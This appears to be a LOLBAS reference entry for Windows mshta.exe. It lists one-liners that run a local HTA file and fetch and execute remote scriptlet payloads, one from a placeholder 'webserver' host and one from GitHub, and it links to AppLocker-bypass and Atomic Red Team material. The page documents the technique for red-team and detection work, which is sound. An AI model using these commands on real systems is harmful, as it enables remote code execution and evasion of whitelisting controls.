## mshta.exe

* Functions: Execute

```
mshta.exe evilfile.hta    

mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))    

mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
```

Acknowledgements:
* Casey Smith - @subtee

Code sample:
* [Mshta_calc.sct](Payload/Mshta_calc.sct)

Resources:
* https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Mshta.md      
* https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4     
* https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct     
* https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/    

Full path:
```
C:\Windows\System32\mshta.exe
C:\Windows\SysWOW64\mshta.exe
```

Notes:
SCT code borrowed from Red Canary - Atomic Red Team 

